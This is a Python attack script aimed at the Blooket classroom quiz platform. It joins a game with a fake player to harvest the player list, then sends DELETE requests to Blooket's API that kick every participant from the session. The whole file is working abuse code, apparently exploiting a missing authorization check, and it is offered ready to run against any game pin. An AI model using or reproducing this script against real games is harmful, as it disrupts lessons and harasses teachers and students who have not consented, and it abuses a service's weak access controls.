"""
	This script gets info about the game, by joining with a custom player.
	It then uses that data to loop through each player in the game, and sends a request to kick them.
"""

import requests, json, argparse

parser = argparse.ArgumentParser(description="Test")
parser.add_argument("-p", help="Game pin")

args = parser.parse_args()

gamePin = str(args.p)

# Join the game with our fake player
# We use this player to get some info about the game session
r = requests.put("https://api.blooket.com/api/firebase/join", data={
	"id": gamePin,
	"name": "blooketbad"
}, headers={
	"Referer": "https://www.blooket.com/"
})

# Store the data returned from the call of the join endpoint
joinText = r.text

# Send request to kick the custom player
r = requests.delete(f"https://api.blooket.com/api/firebase/client?id={gamePin}&name=blooketbad", headers={
	"Referer": "https://www.blooket.com/"
})

if "msg" in json.loads(joinText) and json.loads(joinText)["msg"] == "no game":
	print("No game exists with that pin")
	exit()

jsonInfo = json.loads(joinText)["host"]
if not "c" in jsonInfo:
	print("There are no players in that game")
	exit()
	
# Get a list of players
players = jsonInfo["c"].keys()
# For each player in the game
kickedPlayers = "Kicked players:"
for playerName in players:
	# Send request to kick the player
	r = requests.delete(f"https://api.blooket.com/api/firebase/client?id={gamePin}&name={playerName}", headers={
		"Referer": "https://www.blooket.com/"
	})
	kickedPlayers += f"\n{playerName}"
print(kickedPlayers)